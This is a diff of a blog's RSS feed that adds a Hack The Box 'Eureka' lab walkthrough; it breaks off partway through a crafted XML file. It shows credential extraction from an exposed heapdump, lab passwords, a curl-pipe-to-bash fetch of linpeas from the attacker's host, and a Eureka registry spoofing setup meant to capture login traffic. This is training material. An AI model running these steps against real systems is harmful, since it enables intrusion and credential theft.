@@ -1,4 +1,756 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Home | 0xseclab</title><link>http://localhost:1313/</link><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml"/><description>Home</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Tue, 24 Oct 2023 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Home</title><link>http://localhost:1313/</link></image><item><title>Vintage</title><link>http://localhost:1313/blog/vintage-htb/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/vintage-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Home | 0xseclab</title><link>http://localhost:1313/</link><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml"/><description>Home</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Tue, 24 Oct 2023 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Home</title><link>http://localhost:1313/</link></image><item><title>Eureka</title><link>http://localhost:1313/blog/eureka-htb/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/eureka-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
+EUREKA-HTB-LINUX
+&lt;/div>
+&lt;h2 id="1-nmap-scan">1. NMAP-SCAN:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -p- -sV -sC --open -oN nmap-eureka 10.10.11.66
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427163709-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="2-directory-scanning-via-dirsearch">2. DIRECTORY SCANNING VIA DIRSEARCH:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dirsearch -u http://furni.htb/ -e php,html,txt -t &lt;span class="m">50&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427163933-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see a &lt;strong>/actuator/heapdump&lt;/strong>&lt;/p>
+&lt;p>Lets dump it via visiting the url through browser&lt;/p>
+&lt;p>&lt;code>http://furni.htb/actuator/heapdump&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427164714-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="3-analyzing-heapdump">3. ANALYZING HEAPDUMP:&lt;/h2>
+&lt;p>First check the file:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">file heapdump
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427164714-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Its a HPROF file&lt;/p>
+&lt;p>Lets analyze it via JDumpSpider command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428115313-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>The above credentials we found can be used to access the ssh as oscar190 user&lt;/p>
+&lt;p>username: &lt;em>oscar190&lt;/em>
+password: &lt;em>0sc@r190_S0l!dP@sswd&lt;/em>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428115550-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>This time we found another credentials for accessing Eureka Server which is running on port 8761
+But the credentials shows that the service has been accessed internally on a port 8082&lt;/p>
+&lt;p>username: &lt;em>EurekaSrvr&lt;/em>
+password: &lt;em>0scarPWDisTheB3st&lt;/em>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428121234-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We also find the same password of Oscar for Mysql service.&lt;/p>
+&lt;p>username: &lt;em>oscar190&lt;/em>
+password: &lt;em>0sc@r190_S0l!dP@sswd&lt;/em>&lt;/p>
+&lt;h3 id="options">OPTIONS:&lt;/h3>
+&lt;p>Instead of java Jdumpspider we could also used strings command but the output of this command is quite garbage and difficult to identify the password among them.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">strings heapdump.hprof &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;password\|token\|secret\|key&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="4-ssh-access--mysql">4. SSH ACCESS &amp;amp; MYSQL:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ssh oscar190@furni.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124317-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Lets access mysql:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mysql -u oscar190 -p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124555-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Check the database and tables:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show databases
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124750-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use Furni_WebApp_DB&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124943-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show tables
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428125020-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see users, lets check this table:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span> * from users&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428125205-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>All hashes are &lt;strong>bcrypt&lt;/strong> (&lt;code>$2a$10$&lt;/code>), makes them bruetforce-resistant without serious GPU firepower.&lt;/p>
+&lt;h3 id="internal-enumeration">INTERNAL ENUMERATION:&lt;/h3>
+&lt;p>Lets run linpeas on it first:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl http://10.10.x.x:1234/linpeas.sh &lt;span class="p">|&lt;/span> bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150144-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see an internal ports running on 8081 and 8082&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150745-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Another interesting files that need to be checked manually.&lt;/p>
+&lt;p>Lets enumerate manually now.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ll /home
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150849-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151116-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We find another user &lt;em>miranda-wise&lt;/em>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /var/www -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151236-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Lets check those files we found via linpeas&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /var/www/web/cloud-gateway/src/main/resources/application.yaml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151631-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Same credentials we found earlier for accessing the Internal server Eureka which is on port 8761&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /opt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152004-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Interesting files but the user can&amp;rsquo;t access it since it gives permission denied on the &lt;em>scripts&lt;/em> directory. Something we can later on check after Privilege escalation.&lt;/p>
+&lt;h2 id="5-eureka-port-8761">5. EUREKA PORT 8761:&lt;/h2>
+&lt;p>Its time to access the Eureka server which is available on port 8761, We will use the credentials which we found for it earlier via heapdump.&lt;/p>
+&lt;p>*http://10.10.11.66:8761/&lt;/p>
+&lt;p>Username: &lt;strong>EurekaSrvr&lt;/strong>
+Password: &lt;strong>0scarPWDisTheB3st&lt;/strong>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152722-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152809-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We do see the &lt;em>User-Management-Service&lt;/em>&lt;/p>
+&lt;p>So what is happening here ?&lt;/p>
+&lt;h3 id="eureka-purpose">&lt;strong>EUREKA PURPOSE:&lt;/strong>&lt;/h3>
+&lt;p>&lt;strong>Eureka&amp;rsquo;s main purpose is &lt;em>service discovery&lt;/em>&lt;/strong>—it helps microservices &lt;strong>find and communicate&lt;/strong> with each other dynamically without hard-coded URLs.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Service Registration&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>When a microservice (e.g., &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>) starts, it registers itself with Eureka, saying:&lt;br>
+&lt;em>&amp;ldquo;Hey, I’m USER-MANAGEMENT-SERVICE, and I’m running at &lt;code>localhost:8081&lt;/code>.&amp;rdquo;&lt;/em>&lt;/li>
+&lt;li>Eureka stores this information in its registry.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Service Discovery&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>If another service (e.g., &lt;code>APP-GATEWAY&lt;/code>) needs to call &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>, it asks Eureka:
+&lt;em>&amp;ldquo;Where can I find USER-MANAGEMENT-SERVICE?&amp;rdquo;&lt;/em>&lt;/li>
+&lt;li>Eureka replies:
+&lt;em>&amp;ldquo;It’s at &lt;code>localhost:8081&lt;/code> and is UP.&amp;rdquo;&lt;/em>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Load Balancing (with Ribbon)&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>If multiple instances of a service (e.g., 3 copies of &lt;code>FURNI&lt;/code>) are registered, Eureka helps distribute requests across them.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Health Monitoring&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Eureka periodically checks if registered services are alive (UP/DOWN status).&lt;/li>
+&lt;li>If a service crashes (DOWN), Eureka removes it from the registry, preventing failed requests.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="why-eureka-is-needed">&lt;em>Why Eureka is Needed:&lt;/em>&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Dynamic Scaling&lt;/strong>: In cloud environments, services may start/stop or scale up/down. Hardcoding IPs/ports would break the system.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Resilience&lt;/strong>: If a service fails, Eureka ensures traffic is routed only to healthy instances.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Decoupling&lt;/strong>: Services don’t need to know each other’s locations upfront—they just ask Eureka.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="how-can-we-abuse-it-">&lt;em>How can we abuse it ?&lt;/em>&lt;/h3>
+&lt;p>&lt;strong>Eureka Server Spoofing:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>If an attacker deploys a fake Eureka server, microservices might register with it (due to misconfiguration). The attacker could then:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Redirect traffic to malicious endpoints.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Log sensitive API requests/responses.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;div class="pagebreak">&lt;/div>
+&lt;h2 id="the-attack-scenario">THE ATTACK SCENARIO&lt;/h2>
+&lt;p>&lt;code>lb://USER-MANAGEMENT-SERVICE&lt;/code> makes it MITM vulnerable:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>How the Load Balancer Works&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>When &lt;code>APP-GATEWAY&lt;/code> routes a request to &lt;code>lb://USER-MANAGEMENT-SERVICE/login&lt;/code>, it:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Asks Eureka:&lt;em>&amp;ldquo;Give me the IP/port of &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>.&amp;rdquo;&lt;/em>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Eureka responds with the registered instance (e.g., &lt;code>localhost:8081&lt;/code>).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The gateway forwards the request &lt;strong>without validating the target&amp;rsquo;s identity&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>The MITM Attack Scenario&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>An attacker can &lt;strong>register a fake service&lt;/strong> with Eureka (e.g., malicious-host:8081).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Eureka doesn’t authenticate services by default, so it accepts the fake registration.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Now, when&lt;code>APP-GATEWAY&lt;/code> asks Eureka for &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>, it gets the &lt;strong>attacker’s IP&lt;/strong> instead of the real one.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>All&lt;code>/login&lt;/code> requests are transparently routed to the attacker’s server, which can:&lt;/p>
+&lt;ul>
+&lt;li>Steal credentials (MITM).&lt;/li>
+&lt;li>Modify responses (e.g., inject malicious JavaScript).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Why This Happens&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>No TLS&lt;/strong>: If communication is over HTTP, the attacker can read/modify traffic.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>No Service Authentication&lt;/strong>: Eureka trusts any service that registers.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>&lt;code>lb://&lt;/code> Trusts Eureka Blindly&lt;/strong>: The load balancer assumes Eureka’s response is legitimate.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h4 id="our-goal">OUR GOAL:&lt;/h4>
+&lt;p>If we replace a real service (e.g., USER-MANAGEMENT-SERVICE) with our fake server, all traffic that would normally go to the real one will now go to us. Then the authentication traffic should become:&lt;/p>
+&lt;p>&lt;code>Login Form → APP-GATEWAY → USER-MANAGEMENT-SERVICE (hijacked) → OUR SERVER&lt;/code>&lt;/p>
+&lt;h2 id="6-dumping-xml-configuration-for-user-management-service">6. DUMPING XML CONFIGURATION FOR &lt;strong>USER-MANAGEMENT-SERVICE&lt;/strong>:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -u &lt;span class="s1">&amp;#39;EurekaSrvr:0scarPWDisTheB3st&amp;#39;&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428164043-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="7-create-a-malicious-xml">7. CREATE A MALICIOUS XML:&lt;/h2>
+&lt;p>With the retrieved config file, we can modify these fields in our &lt;em>mitm.xml&lt;/em>:&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;strong>FIELD&lt;/strong>&lt;/th>
+&lt;th>&lt;strong>MODIFICATION&lt;/strong>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;instanceId&amp;gt;&lt;/code>&lt;/td>
+&lt;td>iam-the-mitm&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;hostName&amp;gt;&lt;/code>&lt;/td>
+&lt;td>attacker-IP&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;ipAddr&amp;gt;&lt;/code>&lt;/td>
+&lt;td>attacker-IP&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;port&amp;gt;&lt;/code>&lt;/td>
+&lt;td>Listening port&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;homePageUrl&amp;gt;&lt;/code>&lt;/td>
+&lt;td>http://attacker_ip:port&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;statusPageUrl&amp;gt;&lt;/code>&lt;/td>
+&lt;td>http://attacker_ip:portactuator/info&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>&amp;lt;healthPageUrl&amp;gt;&lt;/code>&lt;/td>
+&lt;td>http://attacker_ip:portactuator/health&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mousepad mitm.xml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;instance&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;instanceId&amp;gt;&lt;/span>iam-the-mitm&lt;span class="nt">&amp;lt;/instanceId&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;hostName&amp;gt;&lt;/span>10.10.16.91&lt;span class="nt">&amp;lt;/hostName&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;app&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/app&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;ipAddr&amp;gt;&lt;/span>10.10.16.91&lt;span class="nt">&amp;lt;/ipAddr&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;status&amp;gt;&lt;/span>UP&lt;span class="nt">&amp;lt;/status&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;overriddenstatus&amp;gt;&lt;/span>UNKNOWN&lt;span class="nt">&amp;lt;/overriddenstatus&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;port&lt;/span> &lt;span class="na">enabled=&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>8081&lt;span class="nt">&amp;lt;/port&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;securePort&lt;/span> &lt;span class="na">enabled=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>443&lt;span class="nt">&amp;lt;/securePort&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;countryId&amp;gt;&lt;/span>1&lt;span class="nt">&amp;lt;/countryId&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;dataCenterInfo&lt;/span> &lt;span class="na">class=&lt;/span>&lt;span class="s">&amp;#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;name&amp;gt;&lt;/span>MyOwn&lt;span class="nt">&amp;lt;/name&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/dataCenterInfo&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;leaseInfo&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;renewalIntervalInSecs&amp;gt;&lt;/span>30&lt;span class="nt">&amp;lt;/renewalIntervalInSecs&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;durationInSecs&amp;gt;&lt;/span>90&lt;span class="nt">&amp;lt;/durationInSecs&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;registrationTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/registrationTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastRenewalTimestamp&amp;gt;&lt;/span>1745839235815&lt;span class="nt">&amp;lt;/lastRenewalTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;evictionTimestamp&amp;gt;&lt;/span>0&lt;span class="nt">&amp;lt;/evictionTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;serviceUpTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/serviceUpTimestamp&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/leaseInfo&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;metadata&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;management.port&amp;gt;&lt;/span>8081&lt;span class="nt">&amp;lt;/management.port&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/metadata&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;homePageUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/&lt;span class="nt">&amp;lt;/homePageUrl&amp;gt;&lt;/span>
